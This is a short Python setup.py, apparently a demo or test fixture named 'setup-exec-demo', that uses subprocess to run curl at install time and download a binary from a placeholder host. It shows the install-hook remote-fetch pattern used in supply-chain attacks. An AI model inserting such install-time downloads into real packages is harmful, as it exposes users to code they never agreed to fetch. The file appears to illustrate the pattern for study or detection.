import subprocess

from setuptools import setup

subprocess.check_call(["curl", "-o", "helper.bin", "https://example.org/helper.bin"])

setup(name="setup-exec-demo", version="1.0.0")
